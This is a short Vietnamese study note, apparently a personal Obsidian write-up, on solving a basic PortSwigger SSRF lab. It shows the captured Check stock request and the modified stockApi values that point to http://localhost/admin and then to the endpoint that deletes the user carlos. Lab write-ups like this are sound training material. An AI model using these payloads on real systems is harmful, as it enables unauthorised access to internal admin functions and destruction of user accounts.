![[lab-basic-ssrf-localhost.png]]
lab vỡ lòng, đổi stockApi để đọc admin localhost rồi xóa carlos

> [!NOTE] phân tích đề
> - có chức năng check stock fetch từ internal system
> - vào /admin trực tiếp thì bị chặn
> - param stockApi điều khiển được URL backend fetch
> -sau khi quan sát gói tin Check stock này, mình thấy tham số stockApi điều khiển URL backend fetch mà response trả về nguyên HTML fetch được, nên mình đổi host thành localhost để đọc /admin.
> -> đọc thêm ở [[định nghĩa SSRF]] và [[lys thuyet SSRF]]

### hướng giải
- [ ] mở 1 product bất kỳ
- [ ] bấm Check stock, bắt bằng Burp
- [ ] quăng qua Repeater
- [ ] đổi stockApi thành http://localhost/admin
- [ ] đọc HTML tìm link delete carlos
- [ ] bắn tiếp stockApi tới link delete

### giải
request gốc:
```http
POST /product/stock HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

đổi thành:
```http
stockApi=http://localhost/admin
```
-> response trả về HTML admin
-> mình thấy có dòng:
```html
<a href="/admin/delete?username=carlos">Delete</a>
```

bắn nốt:
```http
stockApi=http://localhost/admin/delete?username=carlos
```
=> response báo user deleted
=> lab solved

![[lab-basic-ssrf-localhost-result.png]]

> [!NOTE] bài học
> - stockApi fetch hộ => đổi host là xong
> - admin chỉ trust localhost, mà mình mượn được localhost rồi
> - nên mình luôn thử localhost/admin đầu tiên khi thấy stockApi
